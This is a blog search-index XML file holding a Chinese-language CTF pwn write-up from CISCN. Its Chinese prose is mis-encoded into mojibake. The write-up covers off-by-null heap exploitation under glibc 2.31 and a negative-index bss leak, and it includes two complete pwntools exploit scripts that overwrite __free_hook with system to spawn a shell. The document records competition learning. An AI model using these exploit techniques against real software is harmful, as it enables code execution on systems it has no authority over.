<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>å…³äºæ²¡åšå‡ºæ¥çš„è¿™ä¸ªpwn</title>
    <link href="/2022/06/30/%E5%85%B3%E4%BA%8E%E6%B2%A1%E5%81%9A%E5%87%BA%E6%9D%A5%E7%9A%84%E8%BF%99%E4%B8%AApwn/"/>
    <url>/2022/06/30/%E5%85%B3%E4%BA%8E%E6%B2%A1%E5%81%9A%E5%87%BA%E6%9D%A5%E7%9A%84%E8%BF%99%E4%B8%AApwn/</url>
    
    <content type="html"><![CDATA[<h2 id="æ„Ÿæƒ³"><a class="header-anchor" href="#æ„Ÿæƒ³">Â¶</a>æ„Ÿæƒ³</h2><p>æˆ‘æ„Ÿè§‰æˆ‘åƒä¸ªå‚»å­ï¼Œï¼Œï¼Œï¼Œ</p><img src="https://i.bmp.ovh/imgs/2022/06/30/60e48556559e2748.png" style="zoom: 67%;" /><p>æœ‰äº›äººçœŸçš„æ˜¯æœ‰ç‚¹çå‘¢ï¼Œè¿™ä¹ˆæ˜æ˜¾çš„ä¸€ä¸ªoff_by_NULLï¼Œæ²¡çœ‹å‡ºæ¥ã€‚ã€‚ã€‚ã€‚</p><p>ç„¶åå°±æ˜¯overlapçš„å¯»å¸¸æ€è·¯ï¼Œæ³¨æ„2.31ä¸‹çš„idxæ£€æŸ¥ã€‚ã€‚ã€‚ã€‚</p><p>è™½ç„¶ä½†æ˜¯ï¼Œ2.31å±å®è¿˜æ˜¯èŠ±äº†æˆ‘å¾ˆå¤šæ—¶é—´ï¼Œå¾ˆä¹…æ²¡åˆ·é¢˜è¿˜æ˜¯æœ‰å¾ˆå¤šç¼ºç‚¹ã€‚</p><p>é¦–å…ˆæ˜¯leakï¼Œæœ¬æ¥æ˜¯å¾ˆç®€å•çš„ï¼Œç›´æ¥æ‰“chunkåˆ°unsorted binç„¶åæ‹¿å‡ºæ¥å†leakå°±è¡Œäº†ã€‚ä½†æ˜¯è«åå¥‡å¦™ï¼Œæ‹¿å‡ºæ¥å°±ä¸å¯¹äº†ã€‚</p><p>ç„¶åè¿˜æ˜¯è°ƒè¯•æœ€åleakäº†å‡ºæ¥ï¼Œä¸çŸ¥é“ä¸ºå•¥ã€‚</p><img src="https://i.bmp.ovh/imgs/2022/06/30/9cf9355702462588.png" style="zoom:50%;" /><p>ç„¶åå°±æ˜¯overlap+åŠ«æŒäº†ã€‚</p><p>è¿™é‡Œæˆ‘è°¨æ…äº†ä¸€æ³¢ï¼Œçœ‹äº†ä¸€ä¸‹è®¸ä¹…æœªçœ‹çš„libcä¿æŠ¤æœºåˆ¶ï¼Œ2.31ä¸‹freeä¼šæ£€æŸ¥tcacheçš„keyï¼ŒåŒæ—¶off_by_NULLåˆå¹¶çš„æ—¶å€™ä¼šæ£€æŸ¥presizeå’ŒpresizeÂ§</p><p>è¿™è®©æˆ‘æƒ³èµ·äº†å¾ˆä¹…ä¹‹å‰çš„ä¸€ç¯‡ç¬”è®°ï¼Œè¿™é‡Œå•æ‹¿å‡ºæ¥ï¼Œå” ä¸€å” </p><h2 id="é«˜ç‰ˆæœ¬çš„off-by-one"><a class="header-anchor" href="#é«˜ç‰ˆæœ¬çš„off-by-one">Â¶</a>é«˜ç‰ˆæœ¬çš„off_by_one</h2><p><a href="https://zhuanlan.zhihu.com/p/136983333%E5%8F%AF%E4%BB%A5%E5%9C%A8%E8%BF%99%E9%87%8C%E7%9C%8B2.31%E5%92%8C2.29%E4%BB%A5%E5%90%8E%E7%9A%84%E6%A3%80%E6%9F%A5">https://zhuanlan.zhihu.com/p/136983333å¯ä»¥åœ¨è¿™é‡Œçœ‹2.31å’Œ2.29ä»¥åçš„æ£€æŸ¥</a></p><p>2.29ä»¥åå°±ç»™chunkçš„unlinkåŠ äº†presizeçš„æ£€æŸ¥ï¼Œè¿™å°±è®©åŸæ¥éšæ„åˆ©ç”¨çš„off_by_NULLå˜å¾—ä¸æ˜¯é‚£ä¹ˆç®€å•ï¼Œå› ä¸ºsizeæ§åˆ¶ä¸äº†ï¼ˆé™¤äº†æº¢å‡ºï¼‰è¿™æ˜¯ä¼—æ‰€å‘¨çŸ¥çš„ï¼Œæ‰€ä»¥åœ¨å¯»å¸¸çš„unlinkä¸Š ï¼Œè¿™é‡Œå¤šè½¬äº†ä¸€ä¸ªå¼¯ï¼Œä»–æ—¢ç„¶æ£€æŸ¥äº†sizeå’Œpresizeï¼Œé‚£ä¹ˆæˆ‘ç›´æ¥åœ¨chunké‡Œé¢ä¼ªé€ ä¸€ä¸ªchunkï¼Œé‚£è¿™ä¸ªfake_chunkçš„sizeä¸å°±å¯ä»¥æ§åˆ¶äº†å—ã€‚</p><p>å¦‚æ­¤è™½ç„¶è®©åé¢çš„åŠ«æŒå¤æ‚äº†1%ï¼Œä½†æ˜¯è¿˜æ˜¯éå¸¸å¥½æ§åˆ¶çš„ã€‚</p><p>æ­¤å¤–ç”±äºæ­¤å¤„çš„æ˜¯ä¼ªé€ chunkï¼Œæ‰€ä»¥å¿…é¡»è¿˜è¦æ»¡è¶³ä¸€ä¸ªè¦æ±‚ã€‚</p><figure><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span>FD<span class="token operator">-></span>bk <span class="token operator">!=</span> P <span class="token operator">||</span> BK<span class="token operator">-></span>fd <span class="token operator">!=</span> P<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        \     <span class="token function">malloc_printerr</span> <span class="token punctuation">(</span>check_action<span class="token punctuation">,</span> <span class="token string">"corrupted double-linked list"</span><span class="token punctuation">,</span> P<span class="token punctuation">,</span> AV<span class="token punctuation">)</span><span class="token punctuation">;</span>  \<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div></figure><p>fdå’Œbkè¦åˆæ³•ï¼Œå› ä¸ºé»˜è®¤è¯¥chunkæ˜¯åœ¨unsorted biné‡Œé¢çš„ï¼Œä»¥å‰ç›´æ¥freeæ‰“è¿›å»ä¸éœ€è¦è€ƒè™‘è¿™ä¸ªï¼Œæ­¤æ—¶ä¼ªé€ åˆ™éœ€è¦è€ƒè™‘ã€‚</p><p>ä¸€ä¸ªç®€å•çš„æ–¹æ³•å°±æ˜¯fdå’Œbkéƒ½æŒ‡å‘è‡ªå·±å³å¯ã€‚è¿™æ ·å°±æ»¡è¶³äº†ã€‚</p><p>äºæ˜¯å°±æœ‰äº†ä»¥ä¸‹çš„åšæ³•ã€‚</p><p><img src="https://i.bmp.ovh/imgs/2022/07/01/c37768e718d638f6.png" alt=""></p><p>ä»¥åçš„æ­¥éª¤ä¸è¯¦ç»†å†™äº†ï¼Œï¼Œçœ‹exp</p><figure><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment"># io=remote("10.75.1.25",58011)</span><span class="token comment">#io= process("./pwn",env=&#123;"LD_PRELOAD":"./libc.so.6"&#125;)</span>p<span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token comment"># libc = ELF("./libc.so.6")</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/lib/x86_64-linux-gnu/libc.so.6"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Choice: "</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">free</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Choice: "</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Idx: "</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Choice: "</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Idx: "</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Choice: "</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Idx: "</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Size: "</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"Content: "</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token comment"># attach(p)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#put into tcache</span>    free<span class="token punctuation">(</span>i<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>heap_base <span class="token operator">=</span> u64<span class="token punctuation">(</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x7a0</span><span class="token keyword">print</span> <span class="token string">"heap_addr:"</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>heap_base<span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">:</span>add<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>free<span class="token punctuation">(</span>j<span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>add<span class="token punctuation">(</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">0x100</span> <span class="token operator">-</span> <span class="token number">592</span> <span class="token operator">-</span> <span class="token number">0x1ecb80</span><span class="token keyword">print</span> <span class="token string">"libc_base=>"</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token punctuation">)</span>free_hook <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>system <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>free<span class="token punctuation">(</span><span class="token number">6</span><span class="token operator">-</span>i<span class="token punctuation">)</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x1f1</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>heap_base<span class="token operator">+</span><span class="token number">0x9a0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>heap_base<span class="token operator">+</span><span class="token number">0x9a0</span><span class="token punctuation">)</span>payload1 <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0xf0</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x1f0</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload1<span class="token punctuation">)</span><span class="token punctuation">,</span>payload1<span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token comment"># pause()</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>add<span class="token punctuation">(</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#9 uaf</span>free<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>pause<span class="token punctuation">(</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>heap_base<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token comment">#key</span>edit<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#0</span>add<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#9 freehook</span>edit<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">0x8</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h2 id="éé¢„æœŸ"><a class="header-anchor" href="#éé¢„æœŸ">Â¶</a>éé¢„æœŸ</h2><p>è¿™ä¸ªæ˜¯é‡ç‚¹ï¼Œå½“æ—¶æ¯”èµ›æˆ‘å°±åªæ‰¾åˆ°äº†è¿™ä¸ªéé¢„æœŸçš„æ´ï¼Œå¸¸è§çš„ä¸€ä¸ªindexè´Ÿæº¢å‡ºï¼Œå¯¹è¿™ä¸ªæ¯”è¾ƒæ•æ„Ÿï¼Œæ‰€ä»¥å½“æ—¶æ²¡çœ‹åˆ«çš„æ´ï¼Œè¿™é‡Œè®°å½•ä¸€ä¸‹æ˜¯å› ä¸ºï¼Œå¥½å‡ æ¬¡éƒ½æ˜¯è¿™æ ·ç±»å‹çš„æ´ï¼Œæˆ‘éƒ½æ²¡æ‰“å‡ºæ¥ï¼Œå› ä¸ºbssæ®µä¸Šçš„è´Ÿæº¢å‡ºå®åœ¨æƒ³ä¸å‡ºæœ‰ä»€ä¹ˆleakçš„æ–¹å¼ï¼Œç›´åˆ°è¿™æ¬¡çœ‹åˆ°äº†ayakaå¸ˆå‚…çš„wpï¼Œé—®äº†ä¸€é¦–ayakaï¼Œæ‰çŸ¥é“æœ‰äº›ä¸œè¥¿ç¼–è¯‘å°±ä¼šå¸¦æœ‰ï¼Œæ‰€ä»¥è¿™é‡Œè®°å½•ä¸€ä¸‹ã€‚</p><p><img src="https://i.bmp.ovh/imgs/2022/07/01/cbdf367cd2911642.png" alt=""></p><p>é—­ç€çœ¼ç›æ‰“äº†ä¸€åœºæ¯”èµ›ï¼Œè²Œä¼¼15åè¿˜ä¸é”™å‘¢ï¼Œè¿˜æœ‰ä¸ªpwn3è¡€ ğŸ™‚</p><p>æœäº†ï¼Œè¿™ä¹ˆæ˜æ˜¾ï¼Œï¼Œï¼Œä¸è¿‡ä¹Ÿæ˜¯è®°ä½äº†ã€‚ã€‚ã€‚</p><p>æ€è·¯å°±æ˜¯leakå‡ºè¿™ä¸ªåœ°å€ï¼Œç„¶åæ ¹æ®åŸºå€å†™ä¸€ä¸ªgotè¡¨åœ°å€åˆ°è¿™é‡Œï¼Œç„¶åå†leak libcåœ°å€ï¼Œç„¶åç›´æ¥å†™hookå³å¯ã€‚</p><p>å†™hookä¹Ÿæ˜¯ä¸€æ ·çš„æ€è·¯ï¼Œå…ˆæŠŠhookå†™åˆ°ä¸Šé¢ï¼Œç„¶åè¦†ç›–å³å¯ã€‚</p><figure><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>p<span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token comment"># libc = ELF("./libc.so.6")</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/lib/x86_64-linux-gnu/libc.so.6"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Choice: "</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">free</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Choice: "</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Idx: "</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Choice: "</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Idx: "</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Choice: "</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Idx: "</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Size: "</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"Content: "</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">11</span><span class="token punctuation">)</span>bss <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\nDone'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"bss: 0x%x"</span><span class="token punctuation">,</span> bss<span class="token punctuation">)</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>bss<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss<span class="token operator">+</span><span class="token number">0x28</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">10</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\nDone'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x1ec980</span><span class="token comment">#stdin</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'libc_addr: 0x%x'</span><span class="token punctuation">,</span> libc_base<span class="token punctuation">)</span>free_hook <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"__free_hook"</span><span class="token punctuation">]</span>system <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token comment"># libc.address = libc_base</span>poc <span class="token operator">=</span> p64<span class="token punctuation">(</span>bss<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span> <span class="token operator">+</span>p64<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'_IO_2_1_stdout_'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'_IO_2_1_stdin_'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>poc <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'_IO_2_1_stderr_'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>poc<span class="token punctuation">)</span><span class="token punctuation">,</span>poc<span class="token punctuation">)</span>pause<span class="token punctuation">(</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span>pause<span class="token punctuation">(</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>æ²¡åšå‡ºæ¥ã€‚ã€‚ã€‚æƒ­æ„§æƒ­æ„§</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ciscn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Arch-linuxè®°å½•</title>
    <link href="/2022/06/30/Arch-linux%E8%AE%B0%E5%BD%95/"/>
    <url>/2022/06/30/Arch-linux%E8%AE%B0%E5%BD%95/</url>
    
